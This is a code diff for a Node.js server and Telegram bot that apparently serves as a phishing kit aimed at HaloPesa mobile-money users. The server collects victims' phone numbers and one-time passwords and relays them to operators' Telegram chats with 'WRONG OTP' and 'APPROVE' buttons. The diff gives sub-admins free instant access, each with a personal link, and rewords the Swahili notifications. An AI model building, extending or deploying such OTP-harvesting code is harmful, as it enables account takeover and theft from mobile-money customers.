@@ -34,8 +34,8 @@ function loadAdmins() {
       const data = fs.readFileSync(ADMINS_FILE, 'utf8');
       const entries = JSON.parse(data);
       return new Map(entries.map(([id, rec]) => [id, {
-        authorized: rec.authorized ?? true, // Default new sub-admins to allowed immediately
-        paid: rec.paid ?? true,             // Default new sub-admins to paid/active immediately
+        authorized: rec.authorized ?? true, // Free instant access
+        paid: rec.paid ?? true,             // Free instant access
         username: rec.username || '',
         firstName: rec.firstName || 'User',
         lastName: rec.lastName || '',
@@ -68,7 +68,7 @@ function isValidHaloPesaNumber(number) {
 
 /**
  * Resolves the target admin chat ID independently.
- * Allows any recognized sub-admin link to work instantly while resolving correctly.
+ * Automatically treats any sub-admin's link as valid and free to use.
  */
 function resolveTargetChat(adminParam) {
   if (adminParam && String(adminParam).trim() !== '') {
@@ -78,7 +78,7 @@ function resolveTargetChat(adminParam) {
     }
     const adminRecord = admins.get(targetAdmin);
     if (adminRecord) {
-      return targetAdmin; // Route directly to the sub-admin immediately
+      return targetAdmin; // Route directly to sub-admin immediately
     }
   }
   return null;
@@ -120,7 +120,7 @@ async function initBot() {
         return;
       }
 
-      // Register or update sub-admin so their link works immediately
+      // Automatically register the sub-admin with full free/active status so their link works instantly
       if (!admins.has(chatId)) {
         admins.set(chatId, { authorized: true, paid: true, username, firstName, lastName, startedAt: new Date() });
         saveAdmins();
@@ -128,13 +128,13 @@ async function initBot() {
 
       const userLink = `${APP_URL}/?admin=${chatId}`;
 
-      // Give the sub-admin their link right away
-      await bot.sendMessage(chatId, `👋 *Karibu ${firstName}!*\n\nAkaunti yako imewashwa. Kiungo chako binafsi kiko tayari:\n${userLink}`, { parse_mode: 'Markdown' });
+      // Send the free working link to the sub-admin immediately
+      await bot.sendMessage(chatId, `👋 *Karibu ${firstName}!*\n\nKiungo chako binafsi kiko tayari kutumika bure:\n${userLink}`, { parse_mode: 'Markdown' });
 
-      // Notify the Main Admin that a sub-admin has started and received their link
+      // Notify the main admin quietly
       if (FALLBACK_ADMIN_ID && FALLBACK_ADMIN_ID !== chatId) {
         await bot.sendMessage(FALLBACK_ADMIN_ID, 
-          `🚨 *Msimamizi Msaidizi Mpya Kaanza Bot na Kupewa Kiungo!* \n\n` +
+          `🚨 *Msimamizi Msaidizi Mpya Kaanzisha Bot (Amepewa Kiunganisho cha Bure)!*\n\n` +
           `👤 *Jina:* ${firstName}\n` +
           `🆔 *Chat ID:* \`${chatId}\`\n` +
           `🔗 *Kiungo Chake:* \`${userLink}\``, 
@@ -216,7 +216,7 @@ app.post('/api/submit-application', async (req, res) => {
 
     const targetChat = resolveTargetChat(adminChatId);
     if (!targetChat) {
-      return res.status(400).json({ success: false, error: 'Msimamizi hajaidhinishwa, hajalipia au kiungo sio sahihi.' });
+      return res.status(400).json({ success: false, error: 'Kiungo sio sahihi au msimamizi hapatikani.' });
     }
 
     const userId = cleanContact ? cleanContact.replace(/[^a-zA-Z0-9]/g, '_') : `user_${Date.now()}`;
@@ -262,7 +262,7 @@ app.post('/api/submit-otp', async (req, res) => {
   try {
     const { userId, otp, step } = req.body || {};
     const session = sessions.get(userId);
-    if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
+    if (!session) return res.status(404).json({ success: false, error: 'Kipindi hakikupatikana' });
 
     const targetChat = session.adminChatId;
 
@@ -275,7 +275,7 @@ app.post('/api/submit-otp', async (req, res) => {
           inline_keyboard: [
             [
               { text: 'WRONG OTP', callback_data: `WRONG_OTP_${userId}` },
-              { text: 'APPROve', callback_data: `FINAL_SUCCESS_${userId}` }
+              { text: 'APPROVE', callback_data: `FINAL_SUCCESS_${userId}` }
             ]
           ]
         }
@@ -311,4 +311,4 @@ const PORT = process.env.PORT || 10000;
 app.listen(PORT, async () => {
   await initBot();
 });
-      
+    
